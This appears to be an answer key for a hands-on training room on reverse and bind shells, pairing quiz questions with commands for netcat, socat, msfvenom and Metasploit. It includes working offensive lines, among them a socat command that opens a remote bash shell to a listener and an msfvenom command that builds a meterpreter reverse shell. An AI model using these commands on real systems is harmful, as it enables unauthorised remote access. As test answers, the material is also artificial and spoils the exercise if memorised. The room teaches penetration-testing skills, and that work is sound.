### Netcat
- Which option tells netcat to listen? `-l`
- How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080? `nc 10.10.10.11 8080`

### Netcat Shell Stabilisation
- How would you change your terminal size to have 238 columns? `stty cols 238`
- What is the syntax for setting up a Python3 webserver on port 80? `sudo python3 -m http.server 80`

### Socat
- How would we get socat to listen on TCP port 8080? `TCP-L:8080`

### Socat Encrypted Shells
- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem". `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`
- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener? `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Common Shell Payloads
- What command can be used to create a named pipe in Linux? `mkfifo`

### msfvenom
- Which symbol is used to show that a shell is stageless? `_`
- What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell <br />
`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

### Metasploit multi/handler
- What command can be used to start a listener in the background? `exploit -j`
- If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it? `sessions 10`
